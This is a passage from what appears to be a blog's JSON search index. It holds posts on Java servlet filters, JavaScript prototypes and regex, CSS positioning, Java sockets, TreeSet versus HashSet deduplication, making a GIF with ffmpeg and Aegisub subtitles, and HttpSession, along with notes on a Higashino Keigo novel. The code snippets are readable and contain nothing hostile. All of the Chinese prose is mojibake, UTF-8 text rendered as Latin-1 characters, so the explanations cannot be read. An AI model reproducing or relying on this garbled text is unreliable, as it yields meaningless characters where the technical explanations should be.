//ä»–çš„ä½œç”¨æ˜¯å°†è¯·æ±‚è½¬å‘ç»™è¿‡æ»¤å™¨é“¾ä¸Šä¸‹ä¸€ä¸ªå¯¹è±¡ã€‚è¿™é‡Œçš„ä¸‹ä¸€ä¸ªæŒ‡çš„æ˜¯ä¸‹ä¸€ä¸ªfilterï¼Œå¦‚æœæ²¡æœ‰filteré‚£å°±æ˜¯ä½ è¯·æ±‚çš„èµ„æºã€‚ ä¸€èˆ¬filteréƒ½æ˜¯ä¸€ä¸ªé“¾,web.xml é‡Œé¢é…ç½®äº†å‡ ä¸ªå°±æœ‰å‡ ä¸ªã€‚ä¸€ä¸ªä¸€ä¸ªçš„è¿åœ¨ä¸€èµ· //request -&gt; filter1 -&gt; filter2 -&gt;filter3 -&gt; .... -&gt; request resource. }else{ System.out.println(&quot;æ²¡æœ‰é€šè¿‡filter&quot;); httpServletResponse.sendRedirect(&quot;login.html&quot;); } } public void init(FilterConfig config) throws ServletException { } }","categories":[],"tags":[]},{"title":"javaee mvc","slug":"javaee mvc","date":"2018-05-13T12:12:11.000Z","updated":"2020-11-14T17:11:30.725Z","comments":true,"path":"2018/05/13/javaee mvc/","link":"","permalink":"http://yoursite.com/2018/05/13/javaee%20mvc/","excerpt":"","text":"å…·ä½“åŒ…å†…çš„ä¿¡æ¯","categories":[],"tags":[]},{"title":"æ¢¦å¹»èŠ±-ä¸œé‡åœ­å¾è¯»ä¹¦ç¬”è®°","slug":"æ¢¦å¹»èŠ±-ä¸œé‡åœ­å¾è¯»ä¹¦ç¬”è®°","date":"2018-04-28T06:27:13.000Z","updated":"2020-11-14T17:11:31.197Z","comments":true,"path":"2018/04/28/æ¢¦å¹»èŠ±-ä¸œé‡åœ­å¾è¯»ä¹¦ç¬”è®°/","link":"","permalink":"http://yoursite.com/2018/04/28/%E6%A2%A6%E5%B9%BB%E8%8A%B1-%E4%B8%9C%E9%87%8E%E5%9C%AD%E5%90%BE%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/","excerpt":"","text":"æ¢¦å¹»èŠ±ï¼ˆé»„è‰²ç‰µç‰›èŠ±ï¼‰ï¼šåœ¨å¾ˆä¹…ä»¥å‰å‡ºç°ï¼Œå¸é£Ÿè€…ä¼šæœ‰è‡´å¹»ä½œç”¨ï¼Œï¼ˆç±»ä¼¼æ¯’å“ï¼‰ï¼Œå½“æ—¶æ—¥æœ¬å®˜æ–¹ï¼Œå‘½ä»¤äººæ¸…é™¤æ‰€æœ‰ç‰µç‰›èŠ±ã€‚åæ¥ï¼Œè­¦æ–¹ï¼ˆè’²ç”Ÿç¥–è¾ˆï¼‰å’ŒåŒ»ç”Ÿï¼ˆä¾åº­ç¥–è¾ˆï¼‰å‘ç°ï¼Œé»„è‰²ç‰µç‰›èŠ±å¯ä»¥è®©å«ŒçŠ¯è¯´çœŸè¯ï¼Œä¸æ–™é»„è‰²ç‰µç‰›èŠ±æ•£è½äººé—´ï¼Œè¢«æ°‘é—´ï¼ˆç”°ä¸­å’Œé“ï¼‰è·å¾—ã€‚å¥³æ˜Ÿå› ä¸ºæŠ‘éƒå»ä¸–ï¼Œç”°ä¸­å’Œé“ä½œä¸ºä»–çš„ç»ˆæç²‰ä¸ï¼Œå¾—çŸ¥åæ•´æ—¥ä¼¤å¿ƒï¼Œå¹¶æœç”¨é»„è‰²ç‰µç‰›èŠ±ç§å­ï¼Œåœ¨å¥³æ˜Ÿå»ä¸–çš„ä¸‹ä¸€ä¸ªæœˆçš„é‚£å¤©ï¼Œå¸é£Ÿè¿‡å¤šï¼Œå‘ç–¯æ‹¿æ­¦å£«åˆ€åˆ°å¤§è¡—ä¸Šå°†çœŸä¸€ï¼Œå’Œå­æ€æ­»ï¼Œè¿™ä¸ªäº‹ä»¶ä¸ºMMäº‹ä»¶ã€‚ç”°ä¸­å’Œé“æ­»åï¼Œç§å­è¢«ä»–çš„çˆ¶äº²å·¥è—¤å¸¦å›äº†è€å®¶ã€‚çœŸä¸€å’Œå’Œå­çš„å¥³å„¿å¿—æ‘©å­ï¼Œè¢«äº²æˆšå…»å¤§ã€‚è’²ç”ŸçœŸå—£æœ‰ä¸€ä¸ªå„¿å­è¦ä»‹ï¼Œå¨¶äº†å¿—æ‘©å­ä½œä¸ºäºŒæˆ¿å¤ªå¤ªï¼Œæ˜¯ä¸ºäº†è¡¥å¿å¿—æ‘©å­å®¶æ—ã€‚åæ¥ç”Ÿä¸‹è‹å¤ªã€‚è’²ç”Ÿçš„å¤§å®¶æ—ä¸­ï¼Œå°±è‹å¤ªä¸çŸ¥é“ç‰µç‰›èŠ±è¿™ä»¶äº‹ï¼Œæ˜¯çœŸå—£ä¸å¸Œæœ›ä¸‹ä¸€è¾ˆçŸ¥é“è¿™äº›ã€‚å¯¹å…¶æœ‰æ‰€éšç’ã€‚è’²ç”Ÿå®¶æ—ï¼Œå› ä¸ºä¸ºäº†å¯»æ‰¾é»„è‰²ç‰µç‰›èŠ±ï¼Œä¸€ç›´ä¼šæœ‰æ¯å¹´å®šæœŸå»çœ‹ç‰µç‰›èŠ±çš„èŠ±ä¼šï¼Œè‹å¤ªå¾ˆåæ„Ÿï¼Œä¸€æ¬¡å› ä¸ºè„šç–¼ï¼Œåšåˆ°èŠ±ä¼šä¸­é—´ä¼‘æ¯çš„åœ°æ–¹ï¼Œå¶é‡ä¾åº­çš„åäººå­ç¾ã€‚è‹å¤ªå’Œå­ç¾ä¸€è§é’Ÿæƒ…ã€‚äº¤å¾€ä¸€æ®µæ—¶é—´åï¼ŒçœŸå—£å‘ç°è¿™ä»¶äº‹ï¼Œå¾ˆåå¯¹ã€‚å½“æ—¶ï¼Œä¾åº­å®¶æ—å’Œè’²ç”Ÿå®¶æ—ä¼šäº’ç›¸äº¤æ¢ç§˜å¯†ï¼Œä¹Ÿå°±çŸ¥é“äº†ä»–ä»¬ä¸¤çš„æ‹æƒ…ï¼Œå­ç¾å†³å®šä¸è§è‹å¤ªã€‚å°šäººï¼Œä¸€ä¸ªéŸ³ä¹å®¶ã€‚ä»–æœ‰ä¸ªå¦¹å¦¹ï¼Œæ¢¨ä¹ƒï¼Œæ˜¯ä¸€ä¸ªæ¸¸æ³³å¥½æ‰‹ï¼Œå°šäººä¸€ç›´æ´»åœ¨æ¢¨ä¹ƒçš„å…‰è¾‰ä¸‹ã€‚å°šäººå’ŒåŒå­¦é›…å“‰åˆ›å»ºç¤¾å›¢ï¼Œåæ¥é›…å“‰ä¸€æ¬¡å¶é‡å·¥è—¤ï¼Œå·¥è—¤å‘Šè¯‰é›…å“‰å¯ä»¥æœç”¨ç§å­è·å¾—çµæ„Ÿï¼Œä½†æ˜¯ä¸èƒ½æœç”¨å¤ªå¤šã€‚é›…å“‰ç”¨è¿‡åï¼Œåˆè®©å°šäººæœç”¨ï¼Œåˆ›é€ å‡ºä¸å°‘ä½œå“ã€‚å°šäººå°†ç§å­ç»™è‡ªå·±çˆ·çˆ·ç§‹å±±å‘¨æ²»ï¼Œå¸Œæœ›èƒ½å¤§é‡ç¹æ®–ç§å­ã€‚å°šäººå› ä¸ºæœç”¨ï¼Œè¿‡å¤šï¼Œè·³æ¥¼è‡ªæ€ã€‚é›…å“‰æ€•äº‹æƒ…è´¥éœ²ï¼Œé‚å»å¯»ç§‹å±±å‘¨æ²»ï¼Œç»“æœç§‹å±±å‘¨æ²»ç«Ÿç„¶å½“åœºè¦æŠ¥è­¦ï¼Œäºæ˜¯é›…å“‰æ€å®³äº†ç§‹å±±å‘¨æ²»ã€‚åæ¥å°±æ˜¯æ¢¨ä¹ƒï¼Œè‹å¤ªï¼Œè¦ä»‹ï¼Œå­ç¾ï¼Œæ—©æ¿‘å¯»æ‰¾æ€äººå‡¶æ‰‹çš„è¿‡ç¨‹äº†ã€‚","categories":[],"tags":[{"name":"ä¸œé‡åœ­å¾","slug":"ä¸œé‡åœ­å¾","permalink":"http://yoursite.com/tags/%E4%B8%9C%E9%87%8E%E5%9C%AD%E5%90%BE/"}]},{"title":"javascript","slug":"javascript","date":"2018-04-27T11:26:16.000Z","updated":"2020-11-14T17:11:31.779Z","comments":true,"path":"2018/04/27/javascript/","link":"","permalink":"http://yoursite.com/2018/04/27/javascript/","excerpt":"","text":"*prototype *prototype å±æ€§ä½¿æ‚¨æœ‰èƒ½åŠ›å‘å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³• var array = [&apos;banner&apos;,&apos;apple&apos;,&apos;orange&apos;]; Array.prototype.myUpcase = function(){ for (var i = this.length - 1; i &gt;= 0; i--) { this[i] = this[i].toUpperCase(); } }; array.myUpcase(); console.log(array);// [&quot;BANNER&quot;, &quot;APPLE&quot;, &quot;ORANGE&quot;]åœ¨æ„å»ºä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œæ‰€æœ‰çš„æ•°ç»„éƒ½å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•Array.prototype å•ç‹¬ä¸èƒ½å¼•ç”¨æ•°ç»„, Array() å¯¹è±¡å¯ä»¥ã€‚ *forEach() *array.forEach(function(currentValue, index, arr), thisValue)currentValueï¼šå½“å‰å€¼ï¼Œå¿…é¡»indexï¼šcurrentValueå¯¹åº”çš„indexï¼Œå¯é€‰arrï¼šæ“ä½œçš„è¿™ä¸ªarrayè¿™ä¸ªæ•°ç»„ï¼Œå¯é€‰ var array = [3,2,3,4,5]; array.forEach(fn); function fn(item,index,arr){ console.log(&quot;array[&quot;+index+&quot;] : &quot;+item); }; /* array.forEach(function(item,index,arr{ console.log(&quot;array[&quot;+index+&quot;] : &quot;+item); });//ä¹Ÿå¯ä»¥å†™æˆè¿™æ ·ï¼Œæ„Ÿè§‰javaå’Œjså‡½æ•°çš„å‚æ•°å¾ˆä¸ä¸€æ · */ Dateï¼ˆï¼‰å¯¹è±¡ var date = new Date(); var timeStr = date.getFullYear()+&quot; : &quot;+date.getHours()+&quot; : &quot;+date.getMinutes(); console.log(timeStr);//2018 : 19 : 2*regex *ä¿®é¥°ç¬¦ iï¼šå¯¹å¤§å°ä¸æ•æ„Ÿçš„åŒ¹é… gï¼šæ‰§è¡Œå…¨å±€åŒ¹é…ï¼Œï¼ˆä¸æ˜¯æ‰§è¡Œä¸€æ¬¡åŒ¹é…ååœæ­¢ï¼‰ mï¼šæ‰§è¡Œå¤šè¡ŒåŒ¹é…/i var str = &quot;Visist RUnoob&quot;; var patt1 = /runoob/i; console.log(str.match(patt1));//&quot;RUnoob&quot;/g var str=&quot;Is this all there is?&quot;; var patt1=/is/g; alert(str.match(patt1));//is,is patt1 = /is/; alert(str.match(patt1));//is","categories":[],"tags":[{"name":"å®è®­","slug":"å®è®­","permalink":"http://yoursite.com/tags/%E5%AE%9E%E8%AE%AD/"},{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"css position","slug":"css position","date":"2018-04-26T14:15:45.000Z","updated":"2020-11-14T17:11:32.277Z","comments":true,"path":"2018/04/26/css position/","link":"","permalink":"http://yoursite.com/2018/04/26/css%20position/","excerpt":"","text":"/** static relative ç›¸å¯¹å¸ƒå±€ ç›¸å¯¹çš„æ˜¯è‡ªå·±åŸæ¥æ‰€åœ¨çš„ä½ç½® ä¾ç„¶å æœ‰è‡ªå·±åŸæ¥çš„ä½ç½® absolute ç»åº¦å¸ƒå±€ ä¼šè„±ç¦»æ–‡æ¡£æµ å½“çˆ¶å…ƒç´ è¿›è¡Œäº†å®šä½æ—¶ï¼Œç›¸å¯¹çš„æ˜¯çˆ¶å…ƒç´ çš„ä½ç½® è‹¥çˆ¶å…ƒç´ æ²¡æœ‰è¿›è¡Œå®šä½ï¼Œç›¸å¯¹çš„æ˜¯bodyå…ƒç´  fixed å›ºå®šå¸ƒå±€ ä¼šè„±ç¦»æ–‡æ¡£æµ ç›¸å¯¹äºçª—å£è¿›è¡Œå®šä½ */ ä¸‹é¢ä¸»è¦ç ”ç©¶absolute &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; .father{ width: 300px; height:200px; background-color: blue; /*position: relative;*/ } .son{ width: 100%; height: 100%; position: absolute; background-color: red; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;father&quot;&gt; &lt;div class = &quot;son&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªclasssonï¼Œåœ¨fatherä¸‹é¢ï¼Œsonçš„positionä¸ºabsoluteï¼Œä½†æ˜¯fatheræ²¡æœ‰å†™ï¼Œæ‰€ä»¥ï¼Œsonçš„widthï¼š100%ï¼Œheightï¼š100%ä¼šå¸ƒæ»¡æ•´ä¸ªbodyã€‚ä½†æ˜¯ï¼Œå°†fatheré‡Œé¢çš„positionæ”¹ä¸ºrelativeï¼Œsonçš„widthï¼š100%ï¼Œheightï¼š100%å°±ä¼šåªå¸ƒæ»¡fatherè¿™ä¸ªwidthï¼š300pxï¼Œheightï¼š200pxï¼›","categories":[],"tags":[]},{"title":"java ç®€å•socketé€šä¿¡","slug":"java ç®€å•socketé€šä¿¡","date":"2018-04-19T11:15:26.000Z","updated":"2020-11-14T17:11:32.749Z","comments":true,"path":"2018/04/19/java ç®€å•socketé€šä¿¡/","link":"","permalink":"http://yoursite.com/2018/04/19/java%20%E7%AE%80%E5%8D%95socket%E9%80%9A%E4%BF%A1/","excerpt":"","text":"TCPServer ServerSocket ss = new ServerSocket(port);//åˆ›å»ºä»¥serverè¿è¡Œçš„æœºå™¨çš„locahostï¼športçš„æœåŠ¡å™¨ /** é€šè¿‡ss.accept(),é˜»å¡å¼æ¥æ”¶è¿æ¥åˆ°æœåŠ¡å™¨çš„socketï¼Œå¹¶åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ¥ç›‘å¬è¿™ä¸ªsocket */ while(true){ Socket s = ss.accept(); new Thread(new ServerTask(s)).start(); }ServerTaskï¼šè°ƒç”¨Runableæ¥å£, public Class ServerTask implements Runable{ private Socket s; public ServerTask(Socket s){//å°†ç›‘å¬çš„socketèµ‹ç»™s this.s = s; } @Override public void run() {//ç›‘å¬socketçš„è¾“å…¥è¾“å‡ºæµ InputStream is = s.getInputStream();//socket-&gt;server OutputStream os = s.getOutputStream();//server -&gt;socket Scanner sc = null; PrinterWriter pw = null; try { sc = new Scanner(is); pw = new PrinterWriter(os); } catch (IOException e) { e.printStackTrace(); } while(true) { String data = sc.nextLine();//é˜»å¡å¼ç›‘å¬ï¼Œæ˜¯å¦æ¥æ”¶åˆ°socketå‘æ¥æ•°æ® System.out.println(data); pw.println(&quot;xxxxxx&quot;);//æ¥æ”¶åˆ°dataåï¼Œå†è¿”å›ä¿¡æ¯xxxxxç»™socket pw.flush(); } } }client public class Client { public static void main(String[] args) throws IOException{ Socket s = new Socket(&quot;127.0.0.1&quot;,8888);//åˆ›å»ºsocketï¼Œè¿æ¥æœåŠ¡å™¨ï¼Œ127.0.0.1:8888 new Thread(new WriteTask(s)).start();//åˆ›å»ºçº¿ç¨‹å¯¹socketçš„å†™æ•°æ®æµç›‘å¬ socket-ã€‹server new Thread(new ReadTask(s)).start();//åˆ›å»ºçº¿ç¨‹å¯¹socketçš„è¯»æ•°æ®æµç›‘å¬ server - ã€‹socket }WriteTask public class WriteTask implements Runnable { private Socket s; public WriteTask(Socket s){ this.s = s; } @Override public void run() { PrintWriter printWriter = null; try { printWriter = new PrintWriter(s.getOutputStream()); } catch (IOException e) { e.printStackTrace(); } Scanner sc = new Scanner(System.in); while(true){//é˜»å¡å¼åˆ¤æ–­ç»ˆç«¯æ˜¯å¦æœ‰è¾“å…¥ String message = sc.nextLine(); printWriter.println(message);//socket-&gt;server printWriter.flush(); } }ReadTask InputStream is = s.getInputStream(); Scanner sc = new Scanner(is); while(true){//é˜»å¡å¼åˆ¤æ–­æ˜¯å¦æœ‰è¾“å…¥ String message = sc.nextLine();//Server-&gt;socket System.out.println(message); } æ€»ç»“ï¼š1.æœåŠ¡å™¨whiletrueï¼Œé˜»å¡æ¥æ”¶socketï¼Œæ¥åˆ°åï¼Œå¯¹socketä¸“é—¨åˆ›å»ºçº¿ç¨‹è¿›è¡Œç›‘å¬ï¼Œç„¶åå¯¹socketæ¥æ”¶è¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›response2.client åˆ›å»ºsocket 1.clientå†™æ•°æ®ï¼Œå¯¹serverå‘é€requestï¼Œ2.åˆ›å»ºçº¿ç¨‹ï¼Œå¯¹æœåŠ¡å™¨çš„reponseè¿›è¡Œæ¥æ”¶3.PrinterWriteræ˜¯å¯¹outputStreamçš„å°è£…ï¼ŒScanneræ˜¯å¯¹inputStreamå°è£…ï¼Œåªæ˜¯å¾ˆæ–¹ä¾¿æ–‡å­—ä¼ è¾“ï¼Œä½†æ˜¯è¦æ˜¯ä¼ è¾“å›¾ç‰‡æˆ–è€…objectæ—¶ â€¦â€¦.å°±ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥ï¼Œé€‰æ‹©åˆé€‚çš„æµæ˜¯å¾ˆé‡è¦çš„4.æˆ‘ä¸Šè¿°çš„ä»£ç æ˜¯ç®€è¦ç‰ˆ","categories":[],"tags":[{"name":"å®è®­","slug":"å®è®­","permalink":"http://yoursite.com/tags/%E5%AE%9E%E8%AE%AD/"}]},{"title":"TreeSetå’ŒHashSet å»é™¤é‡å¤æ•°æ®çš„ä¸åŒ","slug":"TreeSetå’ŒHashSet å»é™¤é‡å¤æ•°æ®çš„ä¸åŒ","date":"2018-03-27T10:42:57.000Z","updated":"2020-11-14T17:11:33.249Z","comments":true,"path":"2018/03/27/TreeSetå’ŒHashSet å»é™¤é‡å¤æ•°æ®çš„ä¸åŒ/","link":"","permalink":"http://yoursite.com/2018/03/27/TreeSet%E5%92%8CHashSet%20%E5%8E%BB%E9%99%A4%E9%87%8D%E5%A4%8D%E6%95%B0%E6%8D%AE%E7%9A%84%E4%B8%8D%E5%90%8C/","excerpt":"","text":"TreeSetå»é‡é¦–å…ˆTreeSetå¯ä»¥å®ç°æ’åº @org.junit.Test public void testHashSet() { Person person = new Person(&quot;1&quot;,1,1); Person person1 = new Person(&quot;1&quot;,1,2); Person person2 = new Person(&quot;2&quot;,1,2); TreeSet&lt;Person&gt; treeSet = new TreeSet&lt;&gt;(new Comparator&lt;Person&gt;() { @Override public int compare(Person o1, Person o2) { if(o1.getName().equals(o2.getName())){ return 0; } if(o1.getAge() &gt; o2.getAge()){ return 1; }else { return -1; } } }); } /** public Person(String name, int age,int money) { this.name = name; this.age = age; this.money = money; } è¿™æ˜¯Personç±»çš„æ„é€ å™¨ */åœ¨treeSetåˆ›å»ºçš„æ—¶å€™ï¼Œé‡å†™äº†ä»¥ä¸‹ä»£ç 1. TreeSet&lt;Person&gt; treeSet = new TreeSet&lt;&gt;(new Comparator&lt;Person&gt;() { @Override public int compare(Person o1, Person o2) { return 0;//Person o1ç•™ä¸‹ï¼Œo2æ·»åŠ å¤±è´¥ return -1;//å€’åºå­˜å‚¨ return 1;//å‡åºå­˜å‚¨ } });è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œreturn 0ï¼›æ˜¯æ— æ³•æ·»åŠ çš„2.å½“ç„¶ä¹Ÿå¯ä»¥åœ¨Personç±»ä¸­å®ç°comparableæ¥å£ï¼Œé‡å†™æ¥å£ä¸­çš„compareToæ–¹æ³•ï¼Œå…·ä½“å®ç°å’Œä¸Šé¢çš„æ–¹æ³•æ²¡æœ‰å¤ªå¤§åŒºåˆ« HashSetHashSetæ˜¯é€šè¿‡HashMapå®ç°çš„ï¼ŒhashCodeï¼ˆï¼‰å’Œequals()æ˜¯HashMapç”¨çš„, å› ä¸ºæ— éœ€æ’åºæ‰€ä»¥åªéœ€è¦å…³æ³¨å®šä½å’Œå”¯ä¸€æ€§å³å¯ä¿®æ”¹Personç±»ä¸­çš„hashCodeï¼ˆï¼‰å’Œequalsï¼ˆï¼‰æ–¹æ³•ï¼Œä¸¤ä¸ªéƒ½è¦ä¿®æ”¹","categories":[],"tags":[{"name":"å®è®­","slug":"å®è®­","permalink":"http://yoursite.com/tags/%E5%AE%9E%E8%AE%AD/"}]},{"title":"ä¸ºæ‰€æ¬²ä¸ºgifåˆ¶ä½œ","slug":"ä¸ºæ‰€æ¬²ä¸ºgifåˆ¶ä½œ","date":"2018-03-20T08:42:29.000Z","updated":"2020-11-14T17:11:33.781Z","comments":true,"path":"2018/03/20/ä¸ºæ‰€æ¬²ä¸ºgifåˆ¶ä½œ/","link":"","permalink":"http://yoursite.com/2018/03/20/%E4%B8%BA%E6%89%80%E6%AC%B2%E4%B8%BAgif%E5%88%B6%E4%BD%9C/","excerpt":"","text":"å…·ä½“åŸç†ä¸çŸ¥ï¼Œè€Œä¸”ä»£ç å†™çš„å¾ˆæ‹™åŠ£ï¼Œåªæ˜¯ç©ä¸€ç©æœ¬åšå®¢æ˜¯æ¨¡ä»¿ä»¥ä¸Šå¤§ä½¬çš„ä»£ç  ç»¼åˆç‰ˆï¼Œubuntu+ruby å…¶å®æˆ‘æ˜¯çœ‹å¦ä¸€ä¸ªå¤§ä½¬çš„ä»£ç  ubuntu+pythonç‰ˆ åªæ˜¯å®ç°äº†gifåˆ¶ä½œ step1ï¼šå¦‚ä½•ä¸ºè§†é¢‘åŠ å­—å¹• Aegisubå­—å¹•æ•™å­¦ step2ï¼šç ”ç©¶Aegisubçš„å­—å¹•.assæ–‡ä»¶ [Script Info] ; Script generated by Aegisub 3.2.2 ; http://www.aegisub.org/ Title: Default Aegisub file ScriptType: v4.00+ WrapStyle: 0 ScaledBorderAndShadow: yes YCbCr Matrix: None [Aegisub Project Garbage] Audio File: C:/Users/Administrator/Desktop/sorrypy-master/static/sorry/template.mp4 Video File: C:/Users/Administrator/Desktop/sorrypy-master/static/sorry/template.mp4 Video AR Mode: 4 Video AR Value: 1.781250 Active Line: 8 Video Position: 411 [V4+ Styles] Format: Name, Fontname, Fontsize, PrimaryColour, SecondaryColour, OutlineColour, BackColour, Bold, Italic, Underline, StrikeOut, ScaleX, ScaleY, Spacing, Angle, BorderStyle, Outline, Shadow, Alignment, MarginL, MarginR, MarginV, Encoding Style: Default,Arial,20,&amp;H00FFFFFF,&amp;H000000FF,&amp;H00000000,&amp;H00000000,0,0,0,0,100,100,0,0,1,2,2,2,10,10,10,1 [Events] Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text Dialogue: 0,0:00:00.00,0:00:06.87,Default,,0,0,0,,å¥½ï¼Œåˆ«è¯´æˆ‘æ˜¯ç§»é™¤è”ç›Ÿçš„ Dialogue: 0,0:00:05.00,0:00:07.02,Default,,0,0,0,,å°±ç®—ä½ æƒ³è¯¬å‘Šæˆ‘ Dialogue: 0,0:00:07.02,0:00:09.62,Default,,0,0,0,,æˆ‘æœ‰çš„æ˜¯é’±è®©å¾‹å¸ˆå¸®æˆ‘æ‰“å®˜å¸ Dialogue: 0,0:00:09.62,0:00:11.22,Default,,0,0,0,,æˆ‘æƒ³æˆ‘æ ¹æœ¬ä¸ç”¨åç‰¢ Dialogue: 0,0:00:11.22,0:00:12.72,Default,,0,0,0,,ä½ åˆ«ä»¥ä¸ºæœ‰é’±äº†ä¸èµ·å•Š Dialogue: 0,0:00:12.72,0:00:15.62,Default,,0,0,0,,sorryï¼Œæœ‰é’±çœŸçš„äº†ä¸èµ· Dialogue: 0,0:00:15.62,0:00:19.62,Default,,0,0,0,,ä¸è¿‡æˆ‘æƒ³ä½ ä¸ä¼šæ˜ç™½è¿™ç§æ„Ÿè§‰ Dialogue: 0,0:00:19.62,0:00:21.62,Default,,0,0,0,,ä¸æ˜ç™½ Dialogue: 0,0:00:21.62,0:00:23.62,Default,,0,0,0,,åœ¨æœ€ä¸‹é¢æ˜¯å­—å¹•çš„startTimeå’ŒendTimeï¼Œæœ€åé¢æ˜¯å­—å¹•å†…å®¹step3ï¼šå¦‚ä½•åˆ¶ä½œå±äºè‡ªå·±çš„gifï¼Œå½“ç„¶è¦ç”¨åˆ° ffmepg å…·ä½“åŸç†æˆ‘ä¹Ÿä¸çŸ¥é“ é¦–å…ˆä¸‹è½½ffmepg sudo add-apt-repository ppa:kirillshkrogalev/ffmpeg-next sudo apt-get update sudo apt-get install ffmpegå®‰è£…å¥½åç»ˆç«¯ä¸­è¿è¡Œä¸‹é¢è¿™å¥è¯ï¼Œå¤§æ¦‚æ˜¯æ„æ€å°†è§†é¢‘é™„åŠ å­—å¹•è½¬æ¢æˆgifè¿è¡Œè¿™å¥è¯ï¼Œéœ€è¦æœ‰ä»¥ä¸‹å…ƒç´ input.mp4,text2.ass ffmpeg -i input.mp4 -r 8 -vf ass=text2.ass,scale=300:-1 -y sorry.gifinput.mp4æ˜¯åˆšåˆšçš„ä¸ºæ‰€æ¬²ä¸ºçš„è§†é¢‘ï¼Œtext2.asså°±æ˜¯ä¸€ä¸ªå°é‡ç‚¹äº†ï¼Œå› ä¸ºæˆ‘ä»¬è¦ä¿®æ”¹ä»–çš„å†…éƒ¨å­—å¹•step4ï¼š ä¿®æ”¹å­—å¹•é¦–å…ˆï¼Œä½ è¦è‡ªå·±åšä¸€ä¸ªå­—å¹•ï¼Œå¾—åˆ°è§†é¢‘ä¸­æ¯ä¸€å¥è¯çš„startTimeå’ŒendTimeï¼Œè¿™æ ·æ‰èƒ½å¯¹çš„ä¸Šå˜´å‹ï¼Œè®©äººçœ‹gifä¸è‡³äºå¤ªå‡ #coding:utf-8 # # import re # oldFile = open(&quot;sorry.ass&quot;,&quot;r&quot;) # # context = oldFile.read() # # print context # # print &apos;finish&apos; # # print &quot;\\n\\n&quot; # # newContext = re.sub(r&apos;0,,(.*?)\\n&apos;,&apos;0,,{sentence}\\n&apos;,context) # newFile = open(&quot;test.ass&quot;,&apos;w&apos;) # newFile.write(newContext) # newFile.close() # ä»¥ä¸Šæ˜¯å°†æ•°æ®æ›¿æ¢æˆ{sentence} # file = open(&apos;test.ass&apos;,&apos;rb&apos;) # file2 = open(&apos;text2.ass&apos;,&apos;w&apos;) # lines = file.readlines() # sentences = [&apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;] # i = 0 # for line in lines: # if &apos;{sentence}&apos; in line: # line = line.replace(&apos;{sentence}&apos;,sentences[i]) # i += 1 # print line # file2.write(line) #ä»¥ä¸Šå®ç°çš„å°†sentenceæ¢æˆå¯¹åº”çš„å­—å¹•åŸç†ï¼šå°†è‡ªå·±å¾—åˆ°çš„sorry.assè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œå°†å­—å¹•å†…å®¹éƒ½ç”¨{sentence}æ›¿æ¢ï¼Œç„¶åå†é€šè¿‡ï¼Œå°†æƒ³æ”¹çš„å­—å¹•ä¾æ¬¡å¡«å…¥sentencesè¿™ä¸ªlistï¼Œæœ€åéå†å†å°†{sentence}æ›¿æ¢æ‰ã€‚ æœ€åè¿™ä»£ç å¯ä»¥ä¸çœ‹ from subprocess import Popen,PIPE ass_path = &#39;text2.ass&#39; gif_path = &#39;sorry.gif&#39; video_path = &#39;input.mp4&#39; cmd = &quot;ffmpeg -i {video_path} -r 8 -vf ass={ass_path},scale=300:-1 -y {gif_path}&quot; \\ .format(video_path=video_path, ass_path=ass_path, gif_path=gif_path) print(cmd) p = Popen(cmd,shell=True,stdout=PIPE,stderr=PIPE) p.wait() if p.returncode==-1: print(&quot;error&quot;) *å…·ä½“æºä»£ç  https://github.com/pompeii666/mp4ToGif *","categories":[],"tags":[{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","permalink":"http://yoursite.com/tags/%E7%94%9F%E6%B4%BB/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"æç¬‘","slug":"æç¬‘","permalink":"http://yoursite.com/tags/%E6%90%9E%E7%AC%91/"}]},{"title":"HttpSession","slug":"HttpSession","date":"2017-12-14T07:33:50.000Z","updated":"2020-11-14T17:11:34.244Z","comments":true,"path":"2017/12/14/HttpSession/","link":"","permalink":"http://yoursite.com/2017/12/14/HttpSession/","excerpt":"","text":"HttpSessionç±» /** 1ï¼‰åˆ›å»ºæˆ–å¾—åˆ°session HttpSession getSession() HttpSession getSession(boolean create) 2)è®¾ç½®sessionå¯¹è±¡ void setMaxInactiveInterval(int interval):è®¾ç½®sessionçš„æœ‰æ•ˆæ—¶é—´ void invalidate():é”€æ¯sessionå¯¹è±¡ java.lang.String getId() :å¾—åˆ°sessionç¼–å· 3ï¼‰ä¿å­˜ä¼šè¯æ•°æ®åˆ°sessionå¯¹è±¡ void setAttribute(java.lang.String name,java.lang.Object value):ä¿å­˜æ•°æ® java.lang.Object getAttribute(java.lang.String name):è·å–æ•°æ® void removeAttribute(java.lang.String name):æ¸…é™¤æ•°æ® */ SessionåŸç† /** é—®é¢˜ï¼šæœåŠ¡å™¨èƒ½å¤Ÿè¯†åˆ«ä¸åŒçš„æµè§ˆè€… ä»£ç è§£è¯»ï¼šHttpSession seesion = request.getSession(); 1ï¼‰ç¬¬ä¸€æ¬¡è®¿é—®åˆ›å»ºsessionå¯¹è±¡ï¼Œç»™sessionå¯¹è±¡åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„idï¼Œå«JSESSIONID newHttpSession() 2)æŠŠJSESSIONIDä½œä¸ºCookieçš„å€¼å‘é€ç»™æµè§ˆå™¨ä¿å­˜ Cookie cookie = new Cookie(&quot;JSESSIONID&quot;,sessionID); 